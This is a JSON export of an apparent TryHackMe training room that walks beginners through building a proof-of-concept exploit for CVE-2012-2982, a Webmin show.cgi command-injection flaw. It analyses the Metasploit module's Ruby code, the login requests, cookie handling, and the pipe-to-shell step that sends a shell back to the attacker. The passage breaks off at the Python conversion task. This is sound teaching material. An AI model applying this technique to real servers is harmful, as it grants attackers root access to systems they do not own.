{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/6142091b256a7e8d7b6e1fc9349bd425.png', 'title': 'Intro PoC Scripting', 'description': 'Learn the importance and beginner skills of crafting custom proof of concept (PoC) exploit scripts from many different sources.', 'code': 'intropocscripting', 'users': 4401, 'tags': ['exploit development', 'scripting', 'python', 'metasploit', 'poc'], 'type': 'walkthrough', 'difficulty': 'easy', 'userCompleted': False, 'upVotes': 255, 'created': '2020-09-04T20:11:06.066Z', 'published': '2020-10-23T19:10:00.292Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://assets.tryhackme.com/img/banners/default_tryhackme.png', 'creator': 'cd6629', 'tasks': [{'taskTitle': 'Introduction - What are PoC scripts?', 'taskDesc': '<p><i><b><span style="font-family:&quot;Arial&quot;;font-size:18px">Greetings!</span></b></i></p><p><span style="font-family:&quot;Arial&quot;">This room is an introduction to a fundamental skill of most cybersecurity domains; <i>exploit development</i> by <b>crafting exploit scripts from proof of concept code</b>. This room intends to introduce <i>beginner skills</i> and concepts that can be adapted to many different types of exploits.The prerequisite skills I\'d recommend for this room are basic programming and penetration testing experience. <br /></span></p><p><span style="font-family:&quot;Arial&quot;"><i><b>proof of concept</b></i> (PoC): </span><span style="font-family:&quot;Arial&quot;"><span style="color:rgb(34, 34, 34);font-family:Roboto, arial, sans-serif;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:100;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none">evidence, typically derived from an experiment or pilot project, which demonstrates that a design concept, business proposal, etc., is feasible.</span></span></p><p><span style="font-family:&quot;Arial&quot;"><span style="color:rgb(34, 34, 34);font-family:Roboto, arial, sans-serif;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:100;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none"></span></span><span style="font-family:&quot;Arial&quot;"><span style="color:rgb(34, 34, 34);font-family:Roboto, arial, sans-serif;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:100;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="color:rgb(34, 34, 34);font-family:Roboto, arial, sans-serif;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:100;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none">The\n term <i>exploit development</i> is sometimes strictly referred to writing \nprograms that leverage buffer overflow attacks or reverse engineer binary\n files, here it\'s being used more broadly as taking the contents of a CVE and PoC code to\n incite unintended behavior of the target system and gain\nprivileged access. </span></span></span></span></span></p><p><u><b><span style="font-family:&quot;Arial&quot;;font-size:24px">Why learn to write PoC scripts and exploit development?</span></b></u></p><p><span style="font-family:&quot;Arial&quot;">When many students are first introduced to penetration testing and hacking in general, they tend to want to use the easiest route, aka, automating tasks with metasploit. While metasploit is a convenient tool and has a wide range of applications, it takes the focus away from what we are actually exploiting and <b>why</b> something is vulnerable. Being able to examine proof of concept code and craft custom payloads will not only improve exploit development skills, but also skills in the language used to develop them. Ultimately, understanding the intimate and complex details of why something is vulnerable is an essential skill for all facets of information security. <br /></span></p><p><span style="font-family:&quot;Arial&quot;">\ufeffFor those studying for practical certifications, we\'re expected to </span><span style="font-family:&quot;Arial&quot;">adapt proof of concept code from various sources that does </span><em><span style="font-family:&quot;Arial&quot;">not</span></em><span style="font-family:&quot;Arial&quot;"> do what we want immediately, but provides a path to a vulnerable spot in the target system and a method for exploiting. No matter the type of exploit it\'s expected that we\'re able to look at the source code (e.g ruby code of metasploit module or bug trackers), identify the exact exploitable endpoint, what \nparameters get sent, and <u>write a small script that sends the appropriate\n parameters to that endpoint with a custom payload.</u> Not every vulnerability that exists will have a pre-made exploit script to use but, if you learn and practice how to make them yourself, you\'ll acquire a deeper understanding of cybersecurity topics and accumulate more technical skills.</span></p><p><b><u><span style="font-family:&quot;Arial&quot;;font-size:24px">Methodologies</span></u></b></p><p><span style="font-family:&quot;Arial&quot;">As this room uses one isolated example, we cannot apply the knowledge used here to every script we write. However, as you practice this concept more, you will begin to notice patterns and generalities that can be applied more broadly. A handful of common methodologies I\'ve found thus far include:</span></p><ul><li><span style="font-family:&quot;Arial&quot;"><b>Optimize the script and condense unnecessary code</b>: keep it simple stupid<br /></span></li><li><span style="font-family:&quot;Arial&quot;"><b>Read and reread PoC code before researching</b>: assists in identifying errors in scripts and how to fix them, sometimes before they occur<br /></span></li><li><span style="font-family:&quot;Arial&quot;"><b>Research as detailed as possible</b>: not all essential information is found on documentation and stackoverflow<br /></span></li><li><span style="font-family:&quot;Arial&quot;"><b>Prepare to adapt and customize</b>: PoC code sometimes uses pre-made libraries with specific functions you\'ll need to personally craft<br /></span></li><li><span style="font-family:&quot;Arial&quot;"><b>Test segments of code along the way</b>: this makes it easier to pinpoint potential issues</span><span style="font-family:&quot;Arial&quot;"></span><br /><span style="font-family:&quot;Arial&quot;"></span></li></ul>', 'taskType': 'vm', 'taskNo': 1, 'taskCreated': '2020-09-04T20:23:00.770Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5f5446c0ce6ebe3793336c95', 'questions': [{'questionNo': 1, 'question': 'Please read the introduction description<br />', 'hint': ''}]}, {'taskTitle': 'Example - The starting point', 'taskDesc': '<p><span>\ufeff</span><span><span style="font-family:&quot;Arial&quot;">In terms of CTFs, vulnerability scanning, penetration testing, and across an extensive array of security fields, writing PoC scripts can be used to assist or completely accomplish one\'s task a majority of the time. As a result of this, it is one of the most flexible skills to possess and master over time. It is easier to practice with intentionally vulnerable boxes that have known CVE details and documentation as a beginner. <br /></span></span></p><p><span><span style="font-family:&quot;Arial&quot;">The first encounter I had on tryhackme where I wanted to avoid metasploit to learn manual exploitation, I could not find a relevant public exploit to suit my needs. To escalate local privileges I had to either use metasploit or analyze the metasploit module\'s ruby source code and make a custom PoC script. This vulnerability was discovered over eight years ago, but it\'s a very appropriate beginner example to expose the requirements of learning exploit development. <br /></span></span></p><p><span><span style="font-family:&quot;Arial&quot;"><u><span style="font-size:18px">Credentials</span></u><br /></span></span></p><p><span><span style="font-family:&quot;Arial&quot;"><i>username:</i> user1</span></span></p><span><span style="font-family:&quot;Arial&quot;"><i>password:</i> 1user</span></span><p><span><span style="font-family:&quot;Arial&quot;"></span></span></p><p><span><span style="font-family:&quot;Arial&quot;">In this room we\'ll be using python to craft our script, but any scripting language would be suitable. For the sake of focusing on development, we\'ll be skipping enumeration and simulate a situation where we have low-level user access. Enter the IP address into a browser, visit the website, and enter the above credentials. With our local access we can clearly see the <b>platform</b> and <b>version number</b>.</span></span></p><p><img style="width:727.95px;height:186.746px;float:none" src="https://i.imgur.com/xgUhTfd.png" /><br /></p><p><span><span style="font-family:&quot;Arial&quot;"></span></span></p><p><span><span style="font-family:&quot;Arial&quot;"></span></span></p><p><span><span style="font-family:&quot;Arial&quot;"></span></span></p><p><span><span style="font-family:&quot;Arial&quot;"></span></span></p><p><span><span style="font-family:&quot;Arial&quot;"><br /></span></span></p><p><span><span style="font-family:&quot;Arial&quot;">We can use a native Kali tool </span></span><code>searchsploit</code><span><span style="font-family:&quot;Arial&quot;"> to inspect the platform and version number, it parses the exploit-db website for known exploits.</span></span></p><p><code>searchsploit webmin 1.580</code><span><span style="font-family:&quot;Arial&quot;"></span></span></p><p><img style="width:980.817px;height:113.067px" src="https://i.imgur.com/ZgKyRt3.png" /><span><span style="font-family:&quot;Arial&quot;"><br /></span></span></p><p><span><span style="font-family:&quot;Arial&quot;">There is</span></span><span><span style="font-family:&quot;Arial&quot;"> <i>.rb</i> code for our exact target, lets inspect the contents with </span></span><code>cat /usr/share/exploitdb/exploits/unix/remote/21851.rb</code><span><span style="font-family:&quot;Arial&quot;"><br /></span></span></p><p><img style="width:825.95px;height:377.502px;float:none" src="https://i.imgur.com/YW8O7Lo.png" /><br /></p><p><span><span style="font-family:&quot;Arial&quot;">We\'ll be using metasploit\'s code repository as a starting point, </span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/webmin_show_cgi_exec.rb" target="_blank"><span><span style="font-family:&quot;Arial&quot;">this module to be exact</span></span></a><span><span style="font-family:&quot;Arial&quot;">. The module exploits an arbitrary command execution vulnerability in Webmin 1.580, </span></span><b><u><a class="link-a079aa82--primary-53a25e66--link-faf6c434" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2982" target="_blank"><span><span style="font-family:&quot;Arial&quot;"><span>CVE-2012-2982</span></span></span></a></u></b><span><span style="font-family:&quot;Arial&quot;">. The vulnerability exists in the</span><span style="font-family:&quot;Arial&quot;"><em> /file/show.cgi</em></span><span style="font-family:&quot;Arial&quot;"> component and allows an authenticated user, with access to the File Manager Module, to <b>execute arbitrary commands with root privileges</b>.</span></span></p><p><span style="font-family:&quot;Arial&quot;"><b><u><span style="font-size:24px">What does this mean?</span></u></b><br /></span></p><p><span style="font-family:&quot;Arial&quot;">On the surface level, we know that we can execute any program we want on this Ubuntu server. In most scenarios it makes sense to execute the <b>system shell</b>, especially when we have root or administrator privileges. It enables us to have complete control over the target system and manipulate it to our needs. Let\'s take a more detailed look at the CVE description and explain exactly what it means. <br /></span></p><p><span style="font-family:&quot;Arial&quot;"><i><span style="font-size:18px">CVE description</span></i>:</span><span style="font-family:&quot;Arial&quot;"><strong> <i>file/show.cgi</i></strong></span><i><span style="font-family:&quot;Arial&quot;"> in </span><span style="font-family:&quot;Arial&quot;"><strong>Webmin 1.590</strong></span><span style="font-family:&quot;Arial&quot;"> and earlier allows </span><span style="font-family:&quot;Arial&quot;"><strong>remote authenticated users</strong></span><span style="font-family:&quot;Arial&quot;"> to </span><span style="font-family:&quot;Arial&quot;"><strong>execute arbitrary commands</strong></span><span style="font-family:&quot;Arial&quot;"> via an </span><span style="font-family:&quot;Arial&quot;"><strong>invalid character</strong></span><span style="font-family:&quot;Arial&quot;"> in a </span><span style="font-family:&quot;Arial&quot;"><strong>pathname</strong></span><span style="font-family:&quot;Arial&quot;">, as demonstrated by a </span><span style="font-family:&quot;Arial&quot;"><strong>| (pipe)</strong></span><span style="font-family:&quot;Arial&quot;"> character.<br /></span></i><br /><span style="font-family:&quot;Arial&quot;"><span>This means that an input invalidation flaw within the binary file of show.cgi, exploited using a | (pipe) character, allows for remote authenticated attackers to execute any command as a privileged user. Meaning all we need to do is input invalid characters and pipe those to a system command (system shell). </span></span><span style="font-family:&quot;Arial&quot;"><span><span style="font-family:&quot;Arial&quot;"><span>We can </span><span><strong>execute the payload, open a socket connection and send it back to the attacker</strong></span><span> listening with </span><span><code class="code-81e98f88">netcat</code></span></span><br /></span></span></p><p><span style="font-family:&quot;Arial&quot;"><span><u><b><span style="font-size:24px">Understanding the vulnerability</span></b></u><br /></span></span></p><p><span style="font-family:&quot;Arial&quot;">CVE documentation provides resources that can better highlight and demonstrate the source of vulnerabilities. </span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">In open source software, developers keep public track of bugs their platforms and systems produce, usually on github. </span> For this particular exploit, the before and after of the bug that led to CVE-2012-2982 is <a href="https://github.com/webmin/webmin/commit/1f1411fe7404ec3ac03e803cfa7e01515e71a213" target="_blank">documented on github</a>, the vulnerability and how it was fixed.</span></p><p><img style="width:465.95px;height:402.854px" src="https://i.imgur.com/lxtOZjW.png" /><span style="font-family:&quot;Arial&quot;"><br /></span></p><p><span style="font-family:&quot;Arial&quot;">Here we can see a section of /file/show.cgi as it exists in Webmin versions 1.590 and earlier. The highlighted red text indicates the vulnerability while the green indicates the patch. The <i>&lt;</i> operator was introduced to sanitize input of invalid characters, as demonstrated by <i>view_epathinfo.</i> As we know from the description, this input invalidation enables us to open any file we want.<i><br /></i></span></p><p><img style="width:584.828px;height:237.15px" src="https://i.imgur.com/J1EQ8Sw.png" /><span style="font-family:&quot;Arial&quot;"><i><br /></i> </span></p><p><span style="font-family:&quot;Arial&quot;">This is a very small but vital piece of information to know before analyzing the metasploit module, it gives us a clear picture of what we are taking advantage of and what to strive towards while analyzing the code.</span></p><p><span style="font-family:&quot;Arial&quot;">As of the time of this room\'s creation, I could not find a public exploit script for CVE-2012-2982, leaving us the only option to make one for ourselves.<br /></span><br /></p>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2020-09-05T03:43:44.690Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "What is the target's platform and version number?<br />", 'hint': ''}, {'questionNo': 2, 'question': '<p>What is the associated CVE for this platform?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Which file does the vulnerability exist in?<br /></p>', 'hint': 'file/show.cgi'}, {'questionNo': 4, 'question': '<p>What program/command would be the most effective to use in this exploit?<br /></p>', 'hint': 'system shell'}]}, {'taskTitle': 'Translating Metasploit module code', 'taskDesc': '<p><span>\ufeff</span><span style="font-family:&quot;Arial&quot;">\ufeff</span><span style="font-family:&quot;Arial&quot;">\ufeff</span><span style="font-family:&quot;Arial&quot;">Let\'s begin with analyzing the <a href="https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/unix/webapp/webmin_show_cgi_exec.rb" target="_blank">ruby source code</a> of the metasploit module. The source code can be broken up into three main functions; <b>initialize</b>, <b>check</b> and <b>exploit</b>. It would be most beneficial to inspect them separately.</span></p><p><b><u><span style="font-family:&quot;Arial&quot;;font-size:24px">Initialize</span></u></b></p><p><img style="width:526.98px;height:538.933px" src="https://i.imgur.com/8BIIdRx.png" /><span style="font-family:&quot;Arial&quot;;font-size:16px"><br /></span></p><p><span><span><span style="font-family:&quot;Arial&quot;">There is little technicality in this function, but the purpose is to initialize the program with essentials. It begins with a description of the exploit, authors and reference sites of the shellcode and associated CVE. This conversion is mostly unessential and can be skipped. </span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;">There are a few simple parameters to take note of the </span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">update_info</code></span><span style="font-family:&quot;Arial&quot;"> function that we might need to consider converting</span></span></span></p><ul><li><div><p><span><span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">Space = 512</code></span><span style="font-family:&quot;Arial&quot;"> - maximum space in memory to store the payload</span></span></span></p></div></li><li><div><p><span><span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">PayloadType = cmd</code></span><span style="font-family:&quot;Arial&quot;"> - ensures that the payload the exploit uses is the </span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">cmd</code></span></span></span></p></div></li></ul><p><span><span><span style="font-family:&quot;Arial&quot;">And the </span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">register_options</code></span><span style="font-family:&quot;Arial&quot;"> function</span></span></span></p><ul><li><div><p><span><span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">RPORT(10000)</code></span><span style="font-family:&quot;Arial&quot;"> - sets the target port</span></span></span></p></div></li><li><div><p><span><span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">\'SSL\', [true, \'Use SSL\', true]</code></span><span style="font-family:&quot;Arial&quot;"> - whether or not the site uses HTTPS (this didnt so set to false)</span></span></span></p></div></li><li><div><p><span><span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">\'USERNAME\', [true, \'Webmin Username\']</code></span><span style="font-family:&quot;Arial&quot;"> - accepts the username</span></span></span></p></div></li><li><div><p><span><span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">\'PASSWORD\', [true, \'Webmin Password\']</code></span><span style="font-family:&quot;Arial&quot;"> - accepts the password<br /></span></span></span></p></div></li></ul><p><span style="font-family:&quot;Arial&quot;;font-size:16px"></span></p><p><u><span style="font-family:&quot;Arial&quot;;font-size:18px">Information to convert</span></u><br /></p><ul><li><b><span style="font-family:&quot;Arial&quot;;font-size:16px">payload type: cmd or the system shell</span></b></li><li><span style="font-family:&quot;Arial&quot;;font-size:16px"><b>placeholder for the username and passwor</b>d</span></li><li><span style="font-family:&quot;Arial&quot;;font-size:16px"><b>RPORT: the website is on the default HTTP port 80 instead of 10000</b><br /></span></li></ul><p><span style="font-family:&quot;Arial&quot;">Other information such as memory allocation is done automatically when using python so we can ignore this. The website does not use TLS so we\'ll have to note this in the POST request.</span><u><b><span style="font-family:&quot;Arial&quot;;font-size:24px"><br /></span></b></u></p><p><u><b><span style="font-family:&quot;Arial&quot;;font-size:24px">Check</span></b></u></p><p><img style="width:523.95px;height:582.053px" src="https://i.imgur.com/LTiBRZL.png" /><span style="font-family:&quot;Arial&quot;"><br /></span></p><p><span style="font-family:&quot;Arial&quot;">The purpose of this function is to verify that the target is vulnerable to CVE-2012-2982. As this function only exists to verify the vulnerability, it is expendable in our custom script. Let\'s breakdown this function line by line (I\'ll be skipping the print statements)<br /></span></p><ul><li><code>peer = "#{rhost}:#{rport}"</code><span><span><span></span></span><span><span> <span style="font-family:&quot;Arial&quot;">- reserves space for the target IP and port</span></span></span></span></li><li><span><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></span><code>data = "page=%2F&amp;user=#{datastore[\'USERNAME\']}&amp;pass=#{datastore[\'PASSWORD\']}"</code><span><span><span><span><span></span></span><span><span> <span style="font-family:&quot;Arial&quot;">- stores the URL that handles the login request</span></span></span></span></span></span></li><li><span><span><span><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></span></span></span><code>res = send_request_cgi({\'method\'  =&gt; \'POST\', \'uri\'     =&gt; "/session_login.cgi", \'cookie\'  =&gt; "testing=1", \'data\'    =&gt; data}, 25)</code><span><span><span><span style="font-family:&quot;Arial&quot;"> - sends an HTTP POST request to login with compromised credentials </span><br /></span></span></span></li></ul><p><span><span><span><span><span></span></span></span></span></span></p><div><span><span><span style="font-family:&quot;Arial&quot;">\n</span></span></span></div><p><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;">The beginning portion of this function establishes the flow of the rest of the script<br /></span></p><ol><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">sets target IP and port</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">obtains Webmin login page URI<br /></span></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">sends a POST request to the server<br /></span></span></span></span></li></ol><p><span style="font-family:&quot;Arial&quot;"> Here we simply have elements of a POST request, the login page, test cookie, and credentials. We know we need <b>authenticated</b> credentials in order to use this exploit, the POST request logs us in and assigns us a unique cookie to verify our local access privileges on the target and communicate as if we had a graphical interface. In fact, we can use the developer tools in our browser to verify the information. </span></p><p><img style="width:725.35px;height:529.184px" src="https://i.imgur.com/Kpzn6C2.png" /><span style="font-family:&quot;Arial&quot;"><br /></span></p><p><span style="font-family:&quot;Arial&quot;">We can verify the contents of the POST request, the login data <i>page=%2F&amp;user=user1&amp;pass=1user</i> (%2F is <a href="https://www.w3schools.com/tags/ref_urlencode.ASP" target="_blank">an equivalent</a> of forward slash /) and the HTTP response headers.<br /></span></p><p><span style="font-family:&quot;Arial&quot;">The next section of the check function can be intimidating to beginners, but it\'s more simple than it appears. All this section does is format the unique cookie to exclude unnecessary text and generate a random string.</span></p><ul><li><code>if res and res.code == 302 and res.get_cookies =~ /sid/</code><span style="font-family:&quot;Arial&quot;"> - if statement to continue if the HTTP response code is 302 and if the cookie equals the value of sid, session ID</span></li><li><span style="font-family:&quot;Arial&quot;"></span><code>session = res.get_cookies.split("sid=")[1].split(";")[0]</code><span style="font-family:&quot;Arial&quot;"> - formats the cookie into a readable string based on the Set-Cookie header in the HTTP response</span></li><li><span style="font-family:&quot;Arial&quot;"></span><code>command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"</code><span style="font-family:&quot;Arial&quot;"> - generates a random string of 5 alphanumeric characters to use as invalid input<br /></span></li></ul><p><span style="font-family:&quot;Arial&quot;">This part has some important duties within the script. We verify that</span></p><ol><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">the first POST request responds with a 302 (found) status code</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">the cookies are labeled as sid</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">format the cookies for excess text</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">generate the invalid input to pipe into the malicious command<br /></span></span></li></ol><p><span style="font-family:&quot;Arial&quot;">The most important information in this section is the format of the unique cookie and generating a random alphanumeric string. </span></p><p><span style="font-family:&quot;Arial&quot;">The cookie is formatted by reading the output of the <i><a href="https://www.geeksforgeeks.org/http-headers-set-cookie/" target="_blank">Set-Cookie</a></i> header. The actual cookie is a random alphanumeric string but there is other information (the name and path) that is apart of the header, this line of code simply gets rid of the excess information and stores the alphanumeric value. From the developer tools, we see the name sid proceeds the actual value, so the method <i><a href="https://www.geeksforgeeks.org/ruby-string-split-method-with-examples/" target="_blank">split</a></i> is used to <a href="https://spin.atomicobject.com/2007/11/01/ruby-string-split/" target="_blank">split</a> the text at "sid=" and returns an array, storing the alphanumeric value and the remaining text. It\'s then repeated to split at ";" and return an array with no elements, leaving only the alphanumeric cookie value.</span></p><p><span style="font-family:&quot;Arial&quot;">The <i>command</i> variable uses echo to print five <a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf%2FExploit:rand_text_alphanumeric" target="_blank">random alphanumeric</a> characters to be used as invalid input to pipe to the malicious command, generating a random alphanumeric string.<br /></span></p><p><u><span style="font-family:&quot;Arial&quot;;font-size:18px">Information to convert</span></u></p><ul><li><span style="font-family:&quot;Arial&quot;"><span><strong>the login page URI data </strong></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span style="font-family:&quot;Arial&quot;"><span><strong>(credentials and login page file)</strong></span></span></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong>POST request sending the URI data<br /></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong>format the cookie<br /></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong>HTTP response code and the session id is not empty</strong></span></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre">generate five random characters</span></strong></span></strong></span></span></li></ul><p><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"></span>The second request simply checks if the target is vulnerable to the exploit, we\'ll discuss this in more detail below.<br /></span></p><p><u><b><span style="font-family:&quot;Arial&quot;;font-size:24px">Exploit</span></b></u></p><p><img style="width:517.95px;height:575.923px" src="https://i.imgur.com/Ce0MQmm.png" /><span style="font-family:&quot;Arial&quot;"><br /></span></p><p><span style="font-family:&quot;Arial&quot;">You may have noticed some similarities between the check and exploit functions, they are identical aside from the fact that the exploit function sends the actual payload. The initial POST request, formatting cookies and second request to send the payload are identical to the check function. This makes this script easier for us as we can condense redundant code.</span></p><p><span style="font-family:&quot;Arial&quot;">The main difference in this exploit is the change of the <i>command</i> variable. We can see with </span><code><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/EncodedPayload" target="_blank">payload.encoded</a></code><span style="font-family:&quot;Arial&quot;"> that instead of merely testing if the website is vulnerable, we are sending data (the shell) over a network back to our attacking machine. In order for data to be properly sent through a URL, some exploits require <a href="https://www.w3schools.com/tags/ref_urlencode.ASP" target="_blank">URL encoding</a>. Here metasploit is using it as insurance because as we\'ll see in the next task, in this scenario it doesn\'t need to be encoded <b>manually</b> because the payload does not break in transit. <br /></span></p><p><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">Lets discuss the second request. The module does not specify the type of request, therefore using the default GET method. It sends a request with the authenticated cookie to the file that houses the vulnerability <i>show.cgi</i> and enters the invalid input, piping it with | to the malicious command, the system shell. As metasploit automatically establishes a socket connection between the target and attacker, we\'ll have include a line to open a socket on the victim in order to send the system shell back to us. <br /></span></span></p><p><u><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;;font-size:18px">Information to convert</span></span></u></p><ul><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre">store the system shell with a function, encode it and send it back via socket</span></span></span></span></b></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"></span></span></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"><span style="white-space:pre">send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command </span></span></span></span></span></b></li></ul><p><span style="font-family:&quot;Arial&quot;">At this point we know exactly what information we need in order to convert this ruby code to python, lets review everything so far.<br /></span></p><p><u><b><span style="font-family:&quot;Arial&quot;;font-size:24px">Information to convert</span></b></u></p><ul><li><b><span style="font-family:&quot;Arial&quot;;font-size:16px">payload type: cmd or system shell</span></b></li><li><span style="font-family:&quot;Arial&quot;"><span><strong>the login page URI data (credentials, receiving port and login page file)<br /></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong></strong></span></span><span style="font-family:&quot;Arial&quot;"><span><strong>POST request sending the URI data</strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong>format the cookie</strong></span></span><span style="font-family:&quot;Arial&quot;"><span><br /></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong>verify HTTP response code and the session id is not empty</strong></span></strong></span></span><span style="font-family:&quot;Arial&quot;"><b>, print statement to verify success</b><br /></span></li><li><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre">generate five random characters</span></strong></span></strong></span></span></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre">store the system shell with a function, encode it and send it back via socket</span></span></span></span></b></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"></span></span></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"><span style="white-space:pre">send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command </span></span></span></span></span></b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"></span></span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre"></span></strong></span></strong></span></span><span style="font-family:&quot;Arial&quot;;font-size:16px"></span><span style="font-family:&quot;Arial&quot;"></span></li></ul><p><span style="font-family:&quot;Arial&quot;">At first this module may have seemed intimidating, but as we\'ve broken down in this task it\'s rather simple. All it\'s really doing is sending a couple POST requests. While some penetration testers may want to first verify the target is vulnerable to a particular exploit, it\'s not always necessary if the goal is a simple and quick privilege escalation such as this example. You may sometimes find among proof of concept code that it contains unnecessary weight to what could be a simple, quick script. </span><br /></p><p></p>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2020-09-05T04:01:27.011Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "What's the original disclosure date of this exploit?<br />", 'hint': ''}, {'questionNo': 2, 'question': '<p>What HTTP response code do we expect after the initial POST request?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': "<p>What does sid stand for and what is it's purpose?<br /></p>", 'hint': 'Session ID, authentication'}, {'questionNo': 4, 'question': '<p>In the check function, what is it doing to the cookies?<br /></p>', 'hint': 'Remember, the full Set-Cookie header contains more than the "actual" cookie'}, {'questionNo': 5, 'question': '<p>In the second request of the check function, what <b>method</b> is piped into the command?<br /></p>', 'hint': ''}]}, {'taskTitle': 'Converting Ruby to Python', 'taskDesc': '<p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p><span style="font-family:&quot;Arial&quot;">\ufeff</span><span style="font-family:&quot;Arial&quot;">This exploit PoC is written in Python</span><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;">, but you can use your preferred language as an additional challenge. For the most part, the syntax will be relatively the same format with </span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">the POST requests, cookie formatting, and if statement</span>. The main differences in syntax will be the random character and payload functions.<br /></span></p><p><span style="font-family:&quot;Arial&quot;">Lets review exactly what we need to convert again.</span></p><ul><li><b><span style="font-family:&quot;Arial&quot;;font-size:16px">payload type: cmd or system shell</span></b></li><li><span style="font-family:&quot;Arial&quot;"><span><strong>the login page URI data (credentials, receiving port and login page file)<br /></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong></strong></span></span><span 